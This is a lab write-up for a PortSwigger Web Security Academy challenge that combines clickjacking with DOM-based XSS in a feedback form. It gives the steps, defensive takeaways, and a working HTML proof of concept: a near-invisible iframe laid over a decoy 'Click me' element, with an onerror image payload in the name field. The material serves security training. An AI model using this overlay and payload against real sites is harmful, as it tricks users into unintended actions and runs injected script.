# **Clickjacking - Exploiting to Trigger DOM-Based XSS**

🔍 **Challenge:** Exploit a clickjacking vulnerability to trigger a DOM-based XSS attack using an iframe and crafted HTML content.

---

🛠️ **Solution:**

1. **Target Analysis:**  
   - Identified a vulnerable "Submit feedback" functionality that processed user input without proper sanitization.

2. **Exploit Crafting:**  
   - Created a malicious HTML page embedding the vulnerable feedback form in an iframe.  
   - Injected a payload `<img src=1 onerror=print()>` into the "name" field to trigger the XSS.

3. **Positioning and Styling:**  
   - Set the iframe dimensions to `width: 1000px` and `height: 900px` for alignment.  
   - Positioned the decoy element with `top: 810px` and `left: 40px` to align it over the "Submit feedback" button.  
   - Used `opacity: 0.0001` to make the iframe nearly invisible.

4. **Execution:**  
   - Hosted the exploit page on the server.  
   - Delivered the link to the victim.  
   - Upon interaction, the payload executed, triggering the `print()` function.

---

🔑 **Takeaways:**

- **Sanitize User Inputs:** Always validate and sanitize inputs to prevent DOM-based XSS.  
- **Prevent Clickjacking:** Use `X-Frame-Options` or `Content-Security-Policy: frame-ancestors 'none'`.  
- **Secure Feedback Forms:** Implement CSRF tokens and ensure proper user intent verification.

---

💻 **Proof of Concept (PoC):**

```html
<style>
    iframe {
        position: relative;
        width: 1000px;
        height: 900px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 810px;
        left: 40px;
        z-index: 1;
    }
</style>

<div>Click me</div>
<iframe src="https://0ae2009c049304d684d6aa4b0065009d.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=pwned@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

![Exploiting to Trigger DOM-Based XSS](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/csrf-lab14a.PNG)

![Exploiting to Trigger DOM-Based XSS 2](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/csrf-lab14b.PNG)

![Exploiting to Trigger DOM-Based XSS 3](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/csrf-lab14c.PNG) 